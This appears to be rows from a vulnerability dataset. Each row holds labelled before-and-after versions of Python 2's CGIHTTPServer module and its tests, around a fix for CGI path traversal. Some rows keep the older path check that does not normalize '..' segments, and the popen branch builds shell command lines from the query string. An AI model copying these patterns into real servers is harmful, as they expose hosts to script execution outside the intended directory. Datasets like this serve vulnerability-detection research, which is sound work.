        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/n",1
14,c5abced949e6a4b001d1dee321593e74ecadecfe,"Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script.

        Returns True and updates the cgi_info attribute to the tuple
        (dir, rest) if self.path requires running a CGI script.
        Returns False otherwise.

        The default implementation tests whether the normalized url
        path begins with one of the strings in self.cgi_directories
        (and the next character is a '/' or the end of the string).
        """"""
        splitpath = _url_collapse_path_split(self.path)
        if splitpath[0] in self.cgi_directories:
            self.cgi_info = splitpath
            return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
            authorization = authorization.split()
            if len(authorization) == 2:
                import base64, binascii
                env['AUTH_TYPE'] = authorization[0]
                if authorization[0].lower() == ""basic"":
                    try:
                        authorization = base64.decodestring(authorization[1])
                    except binascii.Error:
                        pass
                    else:
                        authorization = authorization.split(':')
                        if len(authorization) == 2:
                            env['REMOTE_USER'] = authorization[0]
        # XXX REMOTE_IDENT
        if self.headers.typeheader is None:
            env['CONTENT_TYPE'] = self.headers.type
        else:
            env['CONTENT_TYPE'] = self.headers.typeheader
        length = self.headers.getheader('content-length')
        if length:
            env['CONTENT_LENGTH'] = length
        referer = self.headers.getheader('referer')
        if referer:
            env['HTTP_REFERER'] = referer
        accept = []
        for line in self.headers.getallmatchingheaders('accept'):
            if line[:1] in ""\t\n\r "":
                accept.append(line.strip())
            else:
                accept = accept + line[7:].split(',')
        env['HTTP_ACCEPT'] = ','.join(accept)
        ua = self.headers.getheader('user-agent')
        if ua:
            env['HTTP_USER_AGENT'] = ua
        co = filter(None, self.headers.getheaders('cookie'))
        if co:
            env['HTTP_COOKIE'] = ', '.join(co)
        # XXX Other HTTP_* headers
        # Since we're setting the env in the parent, provide empty
        # values to override previously set values
        for k in ('QUERY_STRING', 'REMOTE_HOST', 'CONTENT_LENGTH',
                  'HTTP_USER_AGENT', 'HTTP_COOKIE', 'HTTP_REFERER'):
            env.setdefault(k, """")
        os.environ.update(env)

        self.send_response(200, ""Script output follows"")

        decoded_query = query.replace('+', ' ')

        if self.have_fork:
            # Unix -- fork as we should
            args = [script]
            if '=' not in decoded_query:
                args.append(decoded_query)
            nobody = nobody_uid()
            self.wfile.flush() # Always flush before forking
            pid = os.fork()
            if pid != 0:
                # Parent
                pid, sts = os.waitpid(pid, 0)
                # throw away additional data [see bug #427345]
                while select.select([self.rfile], [], [], 0)[0]:
                    if not self.rfile.read(1):
                        break
                if sts:
                    self.log_error(""CGI script exit status %#x"", sts)
                return
            # Child
            try:
                try:
                    os.setuid(nobody)
                except os.error:
                    pass
                os.dup2(self.rfile.fileno(), 0)
                os.dup2(self.wfile.fileno(), 1)
                os.execve(scriptfile, args, os.environ)
            except:
                self.server.handle_error(self.request, self.client_address)
                os._exit(127)

        elif self.have_popen2 or self.have_popen3:
            # Windows -- use popen2 or popen3 to create a subprocess
            import shutil
            if self.have_popen3:
                popenx = os.popen3
            else:
                popenx = os.popen2
            cmdline = scriptfile
            if self.is_python(scriptfile):
                interp = sys.executable
                if interp.lower().endswith(""w.exe""):
                    # On Windows, use python.exe, not pythonw.exe
                    interp = interp[:-5] + interp[-4:]
                cmdline = ""%s -u %s"" % (interp, cmdline)
            if '=' not in query and '""' not in query:
                cmdline = '%s ""%s""' % (cmdline, query)
            self.log_message(""command: %s"", cmdline)
            try:
                nbytes = int(length)
            except (TypeError, ValueError):
                nbytes = 0
            files = popenx(cmdline, 'b')
            fi = files[0]
            fo = files[1]
            if self.have_popen3:
                fe = files[2]
            if self.command.lower() == ""post"" and nbytes > 0:
                data = self.rfile.read(nbytes)
                fi.write(data)
            # throw away additional data [see bug #427345]
            while select.select([self.rfile._sock], [], [], 0)[0]:
                if not self.rfile._sock.recv(1):
                    break
            fi.close()
            shutil.copyfileobj(fo, self.wfile)
            if self.have_popen3:
                errors = fe.read()
                fe.close()
                if errors:
                    self.log_error('%s', errors)
            sts = fo.close()
            if sts:
                self.log_error(""CGI script exit status %#x"", sts)
            else:
                self.log_message(""CGI script exited OK"")

        else:
            # Other O.S. -- execute script in this process
            save_argv = sys.argv
            save_stdin = sys.stdin
            save_stdout = sys.stdout
            save_stderr = sys.stderr
            try:
                save_cwd = os.getcwd()
                try:
                    sys.argv = [scriptfile]
                    if '=' not in decoded_query:
                        sys.argv.append(decoded_query)
                    sys.stdout = self.wfile
                    sys.stdin = self.rfile
                    execfile(scriptfile, {""__name__"": ""__main__""})
                finally:
                    sys.argv = save_argv
                    sys.stdin = save_stdin
                    sys.stdout = save_stdout
                    sys.stderr = save_stderr
                    os.chdir(save_cwd)
            except SystemExit, sts:
                self.log_error(""CGI script exit status %s"", str(sts))
            else:
                self.log_message(""CGI script exited OK"")


# TODO(gregory.p.smith): Move this into an appropriate library.
def _url_collapse_path_split(path):
    """"""
    Given a URL path, remove extra '/'s and '.' path elements and collapse
    any '..' references.

    Implements something akin to RFC-2396 5.2 step 6 to parse relative paths.

    Returns: A tuple of (head, tail) where tail is everything after the final /
    and head is everything before it.  Head will always start with a '/' and,
    if it contains anything else, never have a trailing '/'.

    Raises: IndexError if too many '..' occur within the path.
    """"""
    # Similar to os.path.split(os.path.normpath(path)) but specific to URL
    # path semantics rather than local operating system semantics.
    path_parts = []
    for part in path.split('/'):
        if part == '.':
            path_parts.append('')
        else:
            path_parts.append(part)
    # Filter out blank non trailing parts before consuming the '..'.
    path_parts = [part for part in path_parts[:-1] if part] + path_parts[-1:]
    if path_parts:
        tail_part = path_parts.pop()
    else:
        tail_part = ''
    head_parts = []
    for part in path_parts:
        if part == '..':
            head_parts.pop()
        else:
            head_parts.append(part)
    if tail_part and tail_part == '..':
        head_parts.pop()
        tail_part = ''
    return ('/' + '/'.join(head_parts), tail_part)


nobody = None

def nobody_uid():
    """"""Internal routine to get nobody's uid""""""
    global nobody
    if nobody:
        return nobody
    try:
        import pwd
    except ImportError:
        return -1
    try:
        nobody = pwd.getpwnam('nobody')[2]
    except KeyError:
        nobody = 1 + max(map(lambda x: x[2], pwd.getpwall()))
    return nobody


def executable(path):
    """"""Test for executable file.""""""
    try:
        st = os.stat(path)
    except os.error:
        return False
    return st.st_mode & 0111 != 0


def test(HandlerClass = CGIHTTPRequestHandler,
         ServerClass = BaseHTTPServer.HTTPServer):
    SimpleHTTPServer.test(HandlerClass, ServerClass)


if __name__ == '__main__':
    test()
/n/n/nLib/test/test_httpservers.py/n/n""""""Unittests for the various HTTPServer modules.

Written by Cody A.W. Somerville <cody-somerville@ubuntu.com>,
Josip Dzolonga, and Michael Otteneder for the 2007/08 GHOP contest.
""""""

from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
from SimpleHTTPServer import SimpleHTTPRequestHandler
from CGIHTTPServer import CGIHTTPRequestHandler
import CGIHTTPServer

import os
import sys
import base64
import shutil
import urllib
import httplib
import tempfile
import threading

import unittest
from test import test_support


class NoLogRequestHandler:
    def log_message(self, *args):
        # don't write log messages to stderr
        pass


class TestServerThread(threading.Thread):
    def __init__(self, test_object, request_handler):
        threading.Thread.__init__(self)
        self.request_handler = request_handler
        self.test_object = test_object
        self.test_object.lock.acquire()

    def run(self):
        self.server = HTTPServer(('', 0), self.request_handler)
        self.test_object.PORT = self.server.socket.getsockname()[1]
        self.test_object.lock.release()
        try:
            self.server.serve_forever()
        finally:
            self.server.server_close()

    def stop(self):
        self.server.shutdown()


class BaseTestCase(unittest.TestCase):
    def setUp(self):
        self.lock = threading.Lock()
        self.thread = TestServerThread(self, self.request_handler)
        self.thread.start()
        self.lock.acquire()

    def tearDown(self):
        self.lock.release()
        self.thread.stop()

    def request(self, uri, method='GET', body=None, headers={}):
        self.connection = httplib.HTTPConnection('localhost', self.PORT)
        self.connection.request(method, uri, body, headers)
        return self.connection.getresponse()


class BaseHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, BaseHTTPRequestHandler):
        protocol_version = 'HTTP/1.1'
        default_request_version = 'HTTP/1.1'

        def do_TEST(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

        def do_KEEP(self):
            self.send_response(204)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'keep-alive')
            self.end_headers()

        def do_KEYERROR(self):
            self.send_error(999)

        def do_CUSTOM(self):
            self.send_response(999)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Connection', 'close')
            self.end_headers()

    def setUp(self):
        BaseTestCase.setUp(self)
        self.con = httplib.HTTPConnection('localhost', self.PORT)
        self.con.connect()

    def test_command(self):
        self.con.request('GET', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_request_line_trimming(self):
        self.con._http_vsn_str = 'HTTP/1.1\n'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_bogus(self):
        self.con._http_vsn_str = 'FUBAR'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_digits(self):
        self.con._http_vsn_str = 'HTTP/9.9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_none_get(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_version_none(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('PUT', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_version_invalid(self):
        self.con._http_vsn = 99
        self.con._http_vsn_str = 'HTTP/9.9'
        self.con.putrequest('GET', '/')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 505)

    def test_send_blank(self):
        self.con._http_vsn_str = ''
        self.con.putrequest('', '')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 400)

    def test_header_close(self):
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'close')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_head_keep_alive(self):
        self.con._http_vsn_str = 'HTTP/1.1'
        self.con.putrequest('GET', '/')
        self.con.putheader('Connection', 'keep-alive')
        self.con.endheaders()
        res = self.con.getresponse()
        self.assertEquals(res.status, 501)

    def test_handler(self):
        self.con.request('TEST', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 204)

    def test_return_header_keep_alive(self):
        self.con.request('KEEP', '/')
        res = self.con.getresponse()
        self.assertEquals(res.getheader('Connection'), 'keep-alive')
        self.con.request('TEST', '/')

    def test_internal_key_error(self):
        self.con.request('KEYERROR', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)

    def test_return_custom_status(self):
        self.con.request('CUSTOM', '/')
        res = self.con.getresponse()
        self.assertEquals(res.status, 999)


class SimpleHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, SimpleHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.cwd = os.getcwd()
        basetempdir = tempfile.gettempdir()
        os.chdir(basetempdir)
        self.data = 'We are the knights who say Ni!'
        self.tempdir = tempfile.mkdtemp(dir=basetempdir)
        self.tempdir_name = os.path.basename(self.tempdir)
        temp = open(os.path.join(self.tempdir, 'test'), 'wb')
        temp.write(self.data)
        temp.close()

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            try:
                shutil.rmtree(self.tempdir)
            except:
                pass
        finally:
            BaseTestCase.tearDown(self)

    def check_status_and_reason(self, response, status, data=None):
        body = response.read()
        self.assert_(response)
        self.assertEquals(response.status, status)
        self.assert_(response.reason != None)
        if data:
            self.assertEqual(data, body)

    def test_get(self):
        #constructs the path relative to the root directory of the HTTPServer
        response = self.request(self.tempdir_name + '/test')
        self.check_status_and_reason(response, 200, data=self.data)
        response = self.request(self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        response = self.request(self.tempdir_name)
        self.check_status_and_reason(response, 301)
        response = self.request('/ThisDoesNotExist')
        self.check_status_and_reason(response, 404)
        response = self.request('/' + 'ThisDoesNotExist' + '/')
        self.check_status_and_reason(response, 404)
        f = open(os.path.join(self.tempdir_name, 'index.html'), 'w')
        response = self.request('/' + self.tempdir_name + '/')
        self.check_status_and_reason(response, 200)
        if os.name == 'posix':
            # chmod won't work as expected on Windows platforms
            os.chmod(self.tempdir, 0)
            response = self.request(self.tempdir_name + '/')
            self.check_status_and_reason(response, 404)
            os.chmod(self.tempdir, 0755)

    def test_head(self):
        response = self.request(
            self.tempdir_name + '/test', method='HEAD')
        self.check_status_and_reason(response, 200)
        self.assertEqual(response.getheader('content-length'),
                         str(len(self.data)))
        self.assertEqual(response.getheader('content-type'),
                         'application/octet-stream')

    def test_invalid_requests(self):
        response = self.request('/', method='FOO')
        self.check_status_and_reason(response, 501)
        # requests must be case sensitive,so this should fail too
        response = self.request('/', method='get')
        self.check_status_and_reason(response, 501)
        response = self.request('/', method='GETs')
        self.check_status_and_reason(response, 501)


cgi_file1 = """"""\
#!%s

print ""Content-type: text/html""
print
print ""Hello World""
""""""

cgi_file2 = """"""\
#!%s
import cgi

print ""Content-type: text/html""
print

form = cgi.FieldStorage()
print ""%%s, %%s, %%s"" %% (form.getfirst(""spam""), form.getfirst(""eggs""),\
              form.getfirst(""bacon""))
""""""

class CGIHTTPServerTestCase(BaseTestCase):
    class request_handler(NoLogRequestHandler, CGIHTTPRequestHandler):
        pass

    def setUp(self):
        BaseTestCase.setUp(self)
        self.parent_dir = tempfile.mkdtemp()
        self.cgi_dir = os.path.join(self.parent_dir, 'cgi-bin')
        os.mkdir(self.cgi_dir)

        self.file1_path = os.path.join(self.cgi_dir, 'file1.py')
        with open(self.file1_path, 'w') as file1:
            file1.write(cgi_file1 % sys.executable)
        os.chmod(self.file1_path, 0777)

        self.file2_path = os.path.join(self.cgi_dir, 'file2.py')
        with open(self.file2_path, 'w') as file2:
            file2.write(cgi_file2 % sys.executable)
        os.chmod(self.file2_path, 0777)

        self.cwd = os.getcwd()
        os.chdir(self.parent_dir)

    def tearDown(self):
        try:
            os.chdir(self.cwd)
            os.remove(self.file1_path)
            os.remove(self.file2_path)
            os.rmdir(self.cgi_dir)
            os.rmdir(self.parent_dir)
        finally:
            BaseTestCase.tearDown(self)

    def test_url_collapse_path_split(self):
        test_vectors = {
            '': ('/', ''),
            '..': IndexError,
            '/.//..': IndexError,
            '/': ('/', ''),
            '//': ('/', ''),
            '/\\': ('/', '\\'),
            '/.//': ('/', ''),
            'cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            '/cgi-bin/file1.py': ('/cgi-bin', 'file1.py'),
            'a': ('/', 'a'),
            '/a': ('/', 'a'),
            '//a': ('/', 'a'),
            './a': ('/', 'a'),
            './C:/': ('/C:', ''),
            '/a/b': ('/a', 'b'),
            '/a/b/': ('/a/b', ''),
            '/a/b/c/..': ('/a/b', ''),
            '/a/b/c/../d': ('/a/b', 'd'),
            '/a/b/c/../d/e/../f': ('/a/b/d', 'f'),
            '/a/b/c/../d/e/../../f': ('/a/b', 'f'),
            '/a/b/c/../d/e/.././././..//f': ('/a/b', 'f'),
            '../a/b/c/../d/e/.././././..//f': IndexError,
            '/a/b/c/../d/e/../../../f': ('/a', 'f'),
            '/a/b/c/../d/e/../../../../f': ('/', 'f'),
            '/a/b/c/../d/e/../../../../../f': IndexError,
            '/a/b/c/../d/e/../../../../f/..': ('/', ''),
        }
        for path, expected in test_vectors.iteritems():
            if isinstance(expected, type) and issubclass(expected, Exception):
                self.assertRaises(expected,
                                  CGIHTTPServer._url_collapse_path_split, path)
            else:
                actual = CGIHTTPServer._url_collapse_path_split(path)
                self.assertEquals(expected, actual,
                                  msg='path = %r\nGot:    %r\nWanted: %r' % (
                                  path, actual, expected))

    def test_headers_and_content(self):
        res = self.request('/cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_post(self):
        params = urllib.urlencode({'spam' : 1, 'eggs' : 'python', 'bacon' : 123456})
        headers = {'Content-type' : 'application/x-www-form-urlencoded'}
        res = self.request('/cgi-bin/file2.py', 'POST', params, headers)

        self.assertEquals(res.read(), '1, python, 123456\n')

    def test_invaliduri(self):
        res = self.request('/cgi-bin/invalid')
        res.read()
        self.assertEquals(res.status, 404)

    def test_authorization(self):
        headers = {'Authorization' : 'Basic %s' % \
                base64.b64encode('username:pass')}
        res = self.request('/cgi-bin/file1.py', 'GET', headers=headers)
        self.assertEquals(('Hello World\n', 'text/html', 200), \
             (res.read(), res.getheader('Content-type'), res.status))

    def test_no_leading_slash(self):
        # http://bugs.python.org/issue2254
        res = self.request('cgi-bin/file1.py')
        self.assertEquals(('Hello World\n', 'text/html', 200),
             (res.read(), res.getheader('Content-type'), res.status))


def test_main(verbose=None):
    try:
        cwd = os.getcwd()
        test_support.run_unittest(BaseHTTPServerTestCase,
                                  SimpleHTTPServerTestCase,
                                  CGIHTTPServerTestCase
                                  )
    finally:
        os.chdir(cwd)

if __name__ == '__main__':
    test_main()
/n/n/n",0
15,c5abced949e6a4b001d1dee321593e74ecadecfe,"/Lib/CGIHTTPServer.py/n/n""""""CGI-savvy HTTP Server.

This module builds on SimpleHTTPServer by implementing GET and POST
requests to cgi-bin scripts.

If the os.fork() function is not present (e.g. on Windows),
os.popen2() is used as a fallback, with slightly altered semantics; if
that function is not present either (e.g. on Macintosh), only Python
scripts are supported, and they are executed by the current process.

In all cases, the implementation is intentionally naive -- all
requests are executed sychronously.

SECURITY WARNING: DON'T USE THIS CODE UNLESS YOU ARE INSIDE A FIREWALL
-- it may execute arbitrary Python code or external programs.

Note that status code 200 is sent prior to execution of a CGI script, so
scripts cannot send other status codes such as 302 (redirect).
""""""


__version__ = ""0.4""

__all__ = [""CGIHTTPRequestHandler""]

import os
import sys
import urllib
import BaseHTTPServer
import SimpleHTTPServer
import select


class CGIHTTPRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):

    """"""Complete HTTP server with GET, HEAD and POST commands.

    GET and HEAD also support running CGI scripts.

    The POST command is *only* implemented for CGI scripts.

    """"""

    # Determine platform specifics
    have_fork = hasattr(os, 'fork')
    have_popen2 = hasattr(os, 'popen2')
    have_popen3 = hasattr(os, 'popen3')

    # Make rfile unbuffered -- we need to read one line and then pass
    # the rest to a subprocess, so we can't use buffered input.
    rbufsize = 0

    def do_POST(self):
        """"""Serve a POST request.

        This is only implemented for CGI scripts.

        """"""

        if self.is_cgi():
            self.run_cgi()
        else:
            self.send_error(501, ""Can only POST to CGI scripts"")

    def send_head(self):
        """"""Version of send_head that support CGI scripts""""""
        if self.is_cgi():
            return self.run_cgi()
        else:
            return SimpleHTTPServer.SimpleHTTPRequestHandler.send_head(self)

    def is_cgi(self):
        """"""Test whether self.path corresponds to a CGI script,
        and return a boolean.

        This function sets self.cgi_info to a tuple (dir, rest)
        when it returns True, where dir is the directory part before
        the CGI script name.  Note that rest begins with a
        slash if it is not empty.

        The default implementation tests whether the path
        begins with one of the strings in the list
        self.cgi_directories (and the next character is a '/'
        or the end of the string).
        """"""

        path = self.path

        for x in self.cgi_directories:
            i = len(x)
            if path[:i] == x and (not path[i:] or path[i] == '/'):
                self.cgi_info = path[:i], path[i+1:]
                return True
        return False

    cgi_directories = ['/cgi-bin', '/htbin']

    def is_executable(self, path):
        """"""Test whether argument path is an executable file.""""""
        return executable(path)

    def is_python(self, path):
        """"""Test whether argument path is a Python script.""""""
        head, tail = os.path.splitext(path)
        return tail.lower() in ("".py"", "".pyw"")

    def run_cgi(self):
        """"""Execute a CGI script.""""""
        path = self.path
        dir, rest = self.cgi_info

        i = path.find('/', len(dir) + 1)
        while i >= 0:
            nextdir = path[:i]
            nextrest = path[i+1:]

            scriptdir = self.translate_path(nextdir)
            if os.path.isdir(scriptdir):
                dir, rest = nextdir, nextrest
                i = path.find('/', len(dir) + 1)
            else:
                break

        # find an explicit query string, if present.
        i = rest.rfind('?')
        if i >= 0:
            rest, query = rest[:i], rest[i+1:]
        else:
            query = ''

        # dissect the part after the directory name into a script name &
        # a possible additional path, to be stored in PATH_INFO.
        i = rest.find('/')
        if i >= 0:
            script, rest = rest[:i], rest[i:]
        else:
            script, rest = rest, ''

        scriptname = dir + '/' + script
        scriptfile = self.translate_path(scriptname)
        if not os.path.exists(scriptfile):
            self.send_error(404, ""No such CGI script (%r)"" % scriptname)
            return
        if not os.path.isfile(scriptfile):
            self.send_error(403, ""CGI script is not a plain file (%r)"" %
                            scriptname)
            return
        ispy = self.is_python(scriptname)
        if not ispy:
            if not (self.have_fork or self.have_popen2 or self.have_popen3):
                self.send_error(403, ""CGI script is not a Python script (%r)"" %
                                scriptname)
                return
            if not self.is_executable(scriptfile):
                self.send_error(403, ""CGI script is not executable (%r)"" %
                                scriptname)
                return

        # Reference: http://hoohoo.ncsa.uiuc.edu/cgi/env.html
        # XXX Much of the following could be prepared ahead of time!
        env = {}
        env['SERVER_SOFTWARE'] = self.version_string()
        env['SERVER_NAME'] = self.server.server_name
        env['GATEWAY_INTERFACE'] = 'CGI/1.1'
        env['SERVER_PROTOCOL'] = self.protocol_version
        env['SERVER_PORT'] = str(self.server.server_port)
        env['REQUEST_METHOD'] = self.command
        uqrest = urllib.unquote(rest)
        env['PATH_INFO'] = uqrest
        env['PATH_TRANSLATED'] = self.translate_path(uqrest)
        env['SCRIPT_NAME'] = scriptname
        if query:
            env['QUERY_STRING'] = query
        host = self.address_string()
        if host != self.client_address[0]:
            env['REMOTE_HOST'] = host
        env['REMOTE_ADDR'] = self.client_address[0]
        authorization = self.headers.getheader(""authorization"")
        if authorization:
